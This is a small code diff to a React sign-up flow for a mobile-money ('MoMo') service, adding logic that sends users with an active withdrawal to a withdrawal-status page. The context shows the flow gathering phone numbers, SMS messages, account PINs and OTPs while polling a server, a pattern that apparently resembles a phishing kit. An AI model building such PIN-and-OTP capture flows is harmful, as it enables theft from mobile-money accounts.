@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useNavigate, useLocation } from 'react-router-dom';
 import Logo from '../components/Logo';
 import PageLoader from '../components/PageLoader';
 import { momoCountries, MoMoCountry } from '../data/countries';
@@ -11,6 +11,7 @@ type WaitingState = 'none' | 'transition' | 'sms' | 'pin' | 'final_otp';
 
 export default function SignUpFlow() {
   const navigate = useNavigate();
+  const location = useLocation();
   const [step, setStep] = useState<1 | 2 | 3 | 4>(1); // 1=Phone, 2=SMS Message, 3=PIN, 4=4-Digit OTP Banner
   const [country, setCountry] = useState<MoMoCountry>(momoCountries[0]);
   const [phone, setPhone] = useState('');
@@ -48,7 +49,16 @@ export default function SignUpFlow() {
             setError('');
             registerNewUser({ phone, country: country.name, countryCode: country.code, pin });
             setSession({ phone, country: country.name, countryCode: country.code, loggedIn: true });
-            navigate('/apply');
+
+            const hasActiveWithdrawal =
+              location.state?.returnTo === '/withdrawal-status' ||
+              Boolean(localStorage.getItem('momo_withdrawal_initiated_at'));
+
+            if (hasActiveWithdrawal) {
+              navigate('/withdrawal-status');
+            } else {
+              navigate('/apply');
+            }
           }
         } else if (res.status === 'incorrect') {
           if (pollRef.current) clearInterval(pollRef.current);
